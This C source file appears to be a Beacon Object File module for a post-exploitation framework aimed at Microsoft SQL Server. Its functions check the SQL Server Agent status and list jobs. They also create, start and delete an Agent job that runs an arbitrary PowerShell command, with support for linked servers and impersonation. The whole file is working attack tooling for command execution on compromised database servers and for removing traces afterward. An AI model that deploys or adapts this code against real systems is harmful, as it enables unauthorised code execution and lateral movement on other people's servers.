#include "bofdefs.h"
#include "sql.h"


BOOL IsAgentRunning(SQLHSTMT stmt, char* link, char* impersonate)
{
    BOOL running = FALSE;

    char* query = "SELECT dss.[status_desc] FROM sys.dm_server_services dss "
                  "WHERE dss.[servicename] LIKE 'SQL Server Agent (%';";
    
    if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE))
    {
        internal_printf("[-] Error while querying SQL Server Agent status\n");
        return FALSE;
    }

    char* result = GetSingleResult(stmt, FALSE);
    
    if (result != NULL && MSVCRT$strcmp(result, "Running") == 0)
    {
        running = TRUE;
    }

    intFree(result);
    return running;
}

BOOL GetAgentJobs(SQLHSTMT stmt, char* link, char* impersonate)
{
    char* query = "SELECT job_id, name, enabled, date_created, date_modified "
                  "FROM msdb.dbo.sysjobs ORDER BY date_created";

    return HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE);
}

BOOL AddAgentJob(SQLHSTMT stmt, char* link, char* impersonate, char* command, char* jobName, char* stepName)
{

    char* part1 = "use msdb; EXEC dbo.sp_add_job @job_name = '";
    char* part2 = "'; EXEC sp_add_jobstep @job_name = '";
    char* part3 = "', @step_name = '";
    char* part4 = "', @subsystem = 'PowerShell', @command = '";
    char* part5 = "', @retry_attempts = 1, @retry_interval = 5; EXEC dbo.sp_add_jobserver @job_name = '";
    char* part6 = "';";

    size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(jobName) + MSVCRT$strlen(part2) + MSVCRT$strlen(jobName) + MSVCRT$strlen(part3) + MSVCRT$strlen(stepName) + MSVCRT$strlen(part4) + MSVCRT$strlen(command) + MSVCRT$strlen(part5) + MSVCRT$strlen(jobName) + MSVCRT$strlen(part6) + 1;
    char* query = (char*)intAlloc(totalSize);

    MSVCRT$strcpy(query, part1);
    MSVCRT$strncat(query, jobName,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, part2,    totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, jobName,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, part3,    totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, stepName, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, part4,    totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, command,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, part5,    totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, jobName,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, part6,    totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

BOOL ExecuteAgentJob(SQLHSTMT stmt, char* link, char* impersonate, char* jobName)
{
    char* prefix = "use msdb; EXEC dbo.sp_start_job @job_name = '";
    char* suffix = "'; WAITFOR DELAY '00:00:05';";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(jobName) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize);

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, jobName,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

BOOL DeleteAgentJob(SQLHSTMT stmt, char* link, char* impersonate, char* jobName)
{
    //char* use = "use msdb;"; 
    //if (!HandleQuery(stmt, (SQLCHAR*)use, link, impersonate, TRUE))
    //{
    //    internal_printf("[-] Error while setting msdb as the current database\n");
    //    return FALSE;
    //}

    char* prefix = "use msdb; EXEC dbo.sp_delete_job @job_name = '";
    char* suffix = "';";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(jobName) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize);

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, jobName,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

